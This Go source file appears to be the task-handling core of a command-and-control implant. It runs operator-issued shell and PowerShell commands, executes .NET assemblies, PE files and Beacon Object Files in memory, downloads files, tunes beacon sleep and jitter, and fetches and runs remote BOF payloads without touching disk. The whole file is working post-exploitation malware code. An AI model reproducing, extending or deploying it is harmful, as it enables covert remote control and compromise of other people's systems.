//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func handleShell(task Task, res *TaskResult) {
	out, err := runShell(task.Command, task.Shell)
	if err != nil {
		res.Error = err.Error()
	}
	if out != "" {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handlePS(task Task, res *TaskResult) {
	out, err := getProcessList()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handlePowerPick(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "powerpick is Windows-only"
		return
	}
	done := make(chan string, 1)
	go func() {
		done <- powerPick(task.Command)
	}()
	select {
	case out := <-done:
		if strings.HasPrefix(out, "failed") || strings.Contains(out, "[!] powerpick error:") {
			res.Error = out
		} else {
			res.Output = out
		}
	case <-time.After(30 * time.Second):
		res.Error = "powerpick execution timed out (30s)"
	}
}

func handleExecuteAssembly(task Task, res *TaskResult) {
	out, err := executeAssembly(task.Data)
	if err != nil {
		res.Error = err.Error()
	} else {
		decoded, _ := base64.StdEncoding.DecodeString(out)
		if decoded != nil {
			res.Output = string(decoded)
		} else {
			res.Output = out
		}
	}
}

func handleExecuteAssemblyForkRun(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "execute-assembly fork&run is Windows-only"
		return
	}
	out, err := executeAssemblyForkRun(task.Data)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handlePELoader(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "peloader is Windows-only"
		return
	}
	out, err := peloaderReflective(task.Data)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleBOF(task Task, res *TaskResult) {
	bofData, err := base64.StdEncoding.DecodeString(task.Data)
	if err != nil {
		res.Error = fmt.Sprintf("bof: base64 decode failed: %v", err)
	} else if runtime.GOOS != "windows" {
		res.Error = "bof: Windows-only"
	} else {
		out, err := executeBOF(bofData, task.Command)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = out
		}
	}
}

func handleDownloadURL(task Task, res *TaskResult) {
	url := task.Command
	dest := task.Path
	if dest == "" {
		dest = task.Shell
	}
	if err := downloadFromURL(url, dest); err != nil {
		res.Error = err.Error()
	} else {
		res.Output = "Downloaded to " + dest
		res.Path = dest
	}
}

func handleSetSleep(task Task, res *TaskResult) {
	parts := strings.Split(task.Command, ",")
	if len(parts) >= 1 {
		if i, err := strconv.Atoi(strings.TrimSpace(parts[0])); err == nil && i > 0 {
			IntervalStr = strconv.Itoa(i)
		}
	}
	if len(parts) >= 2 {
		if j, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil {
			JitterStr = strconv.Itoa(j)
		}
	}
	// Re-derive the typed globals from the canonical string config so the new
	// sleep/jitter actually take effect and survive a later reparse (which
	// rebuilds Interval/Jitter from *Str).
	reparseNetworkConfig()
	res.Output = fmt.Sprintf("sleep set to %s s, jitter %s%%", IntervalStr, JitterStr)
}

// handleBOFInfection downloads a BOF .o file from the given URL and executes
// it in-memory (never touches disk).
func handleBOFInfection(task Task, res *TaskResult) {
	url := task.Command
	if url == "" {
		res.Error = "bof_infection: no URL provided"
		return
	}

	data, err := downloadBytes(url)
	if err != nil {
		res.Error = fmt.Sprintf("bof_infection: download failed: %v", err)
		return
	}

	// task.Shell holds the BOF arguments
	out, err := executeBOF(data, task.Shell)
	if err != nil {
		res.Error = fmt.Sprintf("bof_infection: %v", err)
	} else {
		res.Output = out
	}
}

// downloadBytes fetches raw bytes from an HTTP(S) URL into memory.
func downloadBytes(urlStr string) ([]byte, error) {
	req, err := http.NewRequest("GET", urlStr, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}

	return io.ReadAll(resp.Body)
}
